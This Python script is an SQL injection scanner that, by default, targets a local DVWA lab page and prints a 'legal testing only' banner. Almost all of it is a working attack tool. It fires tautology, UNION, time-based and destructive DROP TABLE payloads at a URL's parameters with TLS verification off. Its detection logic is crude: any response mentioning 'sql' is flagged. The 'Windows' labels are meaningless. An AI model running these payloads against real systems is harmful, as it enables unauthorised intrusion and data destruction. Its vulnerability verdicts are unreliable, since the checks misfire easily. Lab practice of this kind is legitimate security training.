#!/usr/bin/env python3
"""
Windows SQLi Scanner - DVWA Edition
Run: python sqli_scanner_windows.py
"""

import requests
import time
import json
import logging
import os
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
import threading
from pathlib import Path

class WindowsSQLiScanner:
    def __init__(self, target_url: str = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = []
        self.lock = threading.Lock()
        
        # Windows logging setup
        log_dir = Path("sqli_logs")
        log_dir.mkdir(exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_dir / 'sqli_scan.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def windows_request(self, url: str) -> dict:
        """Windows-optimized request with timeout"""
        try:
            resp = self.session.get(url, timeout=12, verify=False)
            return {
                'status': resp.status_code,
                'time': resp.elapsed.total_seconds(),
                'length': len(resp.text),
                'text': resp.text.lower()
            }
        except:
            return {'status': 0, 'time': 0, 'length': 0, 'text': ''}
    
    def sqli_payloads(self) -> list:
        return [
            "' OR 1=1--", "' OR '1'='1", "1' OR '1'='1", 
            "' UNION SELECT NULL--", "'; DROP TABLE users--",
            "' AND SLEEP(5)--", "' AND 1=1--", "' AND 1=2--"
        ]
    
    def scan_param(self, param: str, value: str):
        """Test single parameter"""
        time.sleep(0.8)  # Windows rate limit
        
        # Baseline request
        base_resp = self.windows_request(self.target_url)
        
        payloads = self.sqli_payloads()
        for payload in payloads:
            # Craft test URL
            test_url = self.target_url.replace(f"{param}={value}", f"{param}={payload}")
            
            test_resp = self.windows_request(test_url)
            
            # Quick vuln check
            indicators = []
            if 'mysql' in test_resp['text'] or 'sql' in test_resp['text']:
                indicators.append("SQL ERROR")
            if test_resp['time'] > 4:
                indicators.append("TIME DELAY")
            if abs(base_resp['length'] - test_resp['length']) > 200:
                indicators.append("BOOLEAN")
            
            result = {
                'param': param,
                'payload': payload,
                'url': test_url,
                'vulnerable': len(indicators) > 0,
                'indicators': indicators,
                'confidence': len(indicators)
            }
            
            with self.lock:
                self.results.append(result)
                
                if result['vulnerable']:
                    self.logger.warning(f"🚨 VULN: {param}='{payload}' -> {indicators}")
                else:
                    print(f"✓ {param}='{payload[:20]}...' OK")
    
    def run_scan(self):
        """Main Windows scan"""
        print("🔍 Windows SQLi Scanner Starting...")
        print("✅ Target:", self.target_url)
        print("⚠️  LEGAL TESTING ONLY - DVWA/XAMPP\n")
        
        # Extract params
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        print(f"Testing {len(params)} parameters...\n")
        
        # Concurrent testing
        with ThreadPoolExecutor(max_workers=2) as executor:  # Conservative for Windows
            for param_name, param_value in params.items():
                executor.submit(self.scan_param, param_name, param_value[0])
        
        self.save_results()
        print("\n✅ Scan complete! Check sqli_logs/ folder")

    def save_results(self):
        Path("sqli_logs").mkdir(exist_ok=True)
        with open("sqli_logs/results.json", "w") as f:
            json.dump(self.results, f, indent=2)

if __name__ == "__main__":
    # DVWA default vulnerable URL
    scanner = WindowsSQLiScanner()
    scanner.run_scan()